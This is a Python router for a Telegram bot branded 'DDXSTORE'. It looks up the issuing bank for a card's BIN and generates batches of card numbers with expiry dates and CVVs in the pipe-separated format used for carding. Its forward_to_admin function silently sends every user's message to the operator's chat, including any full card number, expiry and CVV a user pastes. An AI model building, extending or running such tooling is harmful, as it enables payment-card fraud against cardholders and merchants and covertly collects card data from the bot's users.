import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from bot.database.queries import is_user_banned, increment_request_stat, increment_request_count
from bot.database.bin_db import log_request
from bot.utils.validators import is_bin_pattern
from bot.utils.bin_lookup import bin_lookup
from bot.utils.rate_limiter import check_rate_limit, check_flood
from bot.services.country_service import find_country, get_country_info_text
from bot.services.i18n import DEFAULT_REPLY, MSG_BANNED, MSG_RATE_LIMIT, MSG_FLOOD, BTN_GENERATE_AGAIN
from bot.config.settings import ADMIN_ID, DEFAULT_CARD_COUNT
from bot.utils.logger import get_logger

logger = get_logger("router")

_CARD_FULL_RE = re.compile(
    r"^(\d{6,19})[|/\-](\d{1,2})[|/\-](\d{2,4})([|/\-]\d{3,4})?$"
)
_GEN_PATTERN_RE = re.compile(r"^([\dxX]{6,19})$")
_PIPE_BIN_RE = re.compile(r"^(\d{6})")


def _build_bin_msg(digits: str, info: dict) -> str:
    prepaid_text = "Yes" if info.get("prepaid") else "No" if info.get("prepaid") is False else "N/A"
    return (
        "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
        "   \U0001f4b3  DDXSTORE \u2014 BIN Lookup\n"
        "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
        f"\U0001f522  BIN      \u2502  {digits[:6]}\n"
        f"\U0001f3e6  Brand    \u2502  {info['scheme']}\n"
        f"\U0001f4c4  Type     \u2502  {info['type']}\n"
        f"\u2b50  Level    \u2502  {info['level']}\n"
        f"\U0001f3e0  Bank     \u2502  {info['bank']}\n"
        f"\U0001f30d  Country  \u2502  {info['country']}  {info['emoji']}\n"
        f"\U0001f4b0  Prepaid  \u2502  {prepaid_text}\n\n"
        "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
        "   \u00a9 DDXSTORE \u2022 @ddx22\n"
        "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500"
    )


async def forward_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not ADMIN_ID or not update.message:
        return
    user = update.message.from_user
    if not user or user.id == ADMIN_ID:
        return
    try:
        name = f"@{user.username}" if user.username else user.first_name or str(user.id)
        text = update.message.text or ""
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"\U0001f4e9 {name} ({user.id}):\n{text[:300]}",
        )
    except Exception:
        pass


async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    user = update.message.from_user
    if not user:
        return

    if is_user_banned(user.id):
        await update.message.reply_text(MSG_BANNED)
        return

    if check_flood(user.id):
        await update.message.reply_text(MSG_FLOOD)
        return

    if not check_rate_limit(user.id):
        await update.message.reply_text(MSG_RATE_LIMIT)
        return

    await forward_to_admin(update, context)

    text = update.message.text.strip()

    card_match = _CARD_FULL_RE.match(text)
    if card_match:
        digits = re.sub(r"[^0-9]", "", card_match.group(1))
        if len(digits) >= 6:
            logger.info(f"User {user.id} auto-detected card format: {text[:20]}")
            log_request(user.id, "auto_bin", digits[:6])
            increment_request_stat()
            increment_request_count(user.id)
            try:
                info = await bin_lookup(digits[:6])
                await update.message.reply_text(_build_bin_msg(digits, info))
            except Exception:
                await update.message.reply_text(DEFAULT_REPLY)
            return

    raw = re.sub(r"[^0-9xX]", "", text)
    has_x = "x" in raw.lower()
    digit_part = re.sub(r"[^0-9]", "", raw.lower().split("x")[0] if has_x else raw)

    if has_x and len(digit_part) >= 6:
        logger.info(f"User {user.id} auto-detected generation pattern")
        log_request(user.id, "auto_gen", digit_part[:6])
        increment_request_stat()
        increment_request_count(user.id)
        from bot.utils.card_generator import generate_cards
        from bot.utils.bin_lookup import bin_lookup as _bl
        try:
            info = await _bl(digit_part[:6])
        except Exception:
            info = {"scheme": "N/A", "type": "N/A", "bank": "N/A",
                    "country": "N/A", "emoji": "\U0001f3f3\ufe0f"}
        cards = generate_cards(digit_part, DEFAULT_CARD_COUNT)
        lines = [f"<code>{c['number']}|{c['month']}|{c['year']}|{c['cvv']}</code>" for c in cards]
        msg = (
            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
            "   \U0001f4b3  DDXSTORE \u2014 Auto Gen\n"
            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
            f"\u2022 BIN     \u2502 {digit_part[:6]}\n"
            f"\u2022 Brand   \u2502 {info['scheme']}\n"
            f"\u2022 Bank    \u2502 {info['bank']}\n"
            f"\u2022 Country \u2502 {info['country']} {info['emoji']}\n\n"
            + "\n".join(lines) + "\n\n"
            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
            "   \u00a9 DDXSTORE \u2022 @ddx22\n"
            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500"
        )
        callback_data = f"regen_{digit_part}_{DEFAULT_CARD_COUNT}"
        keyboard = [[InlineKeyboardButton(BTN_GENERATE_AGAIN, callback_data=callback_data)]]
        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
        return

    if is_bin_pattern(text):
        digits = re.sub(r"[^0-9]", "", text)
        if len(digits) >= 6:
            logger.info(f"User {user.id} BIN lookup: {digits[:6]}")
            log_request(user.id, "bin", digits[:6])
            increment_request_stat()
            increment_request_count(user.id)
            try:
                from bot.database.queries import increment_bin_stat
                increment_bin_stat()
                info = await bin_lookup(digits[:6])
                await update.message.reply_text(_build_bin_msg(digits, info))
            except Exception:
                pass
            return

    country_match, _ = await find_country(text)
    if country_match:
        log_request(user.id, "country", text[:50])
        increment_request_stat()
        increment_request_count(user.id)
        msg = get_country_info_text(country_match, False)
        await update.message.reply_text(msg)
        return

    await update.message.reply_text(DEFAULT_REPLY)
